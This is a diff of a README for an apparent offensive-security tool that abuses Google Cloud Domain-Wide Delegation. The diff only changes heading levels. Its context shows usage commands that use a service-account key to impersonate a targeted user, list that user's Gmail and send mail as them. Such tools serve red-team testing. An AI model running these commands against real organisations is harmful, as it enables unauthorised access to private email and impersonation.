@@ -4,7 +4,7 @@ Tool to perform GCP Domain Wide Delegation abuse and access Gmail and Drive data
 <img src="./DomainWideDelegation_GCP.png" alt="gcpdelegation" width="800"/>
 
 ## Delegate tool usage
-#### Gmail usage
+### Gmail usage
 List all Gmail emails (limit 200 emails)
 ```
 python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a list
@@ -35,7 +35,7 @@ Send an email as targeted.delegated@mackinsoncloud.com to jdoe@gmail.com specify
 python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a send -r jdoe@gmail.com -s "Test Messaage subject" -c "Hello this is a test email"
 ```
 
-#### Drive usage
+### Drive usage
 
 List all files and folders within the targeted Drive account
 ```
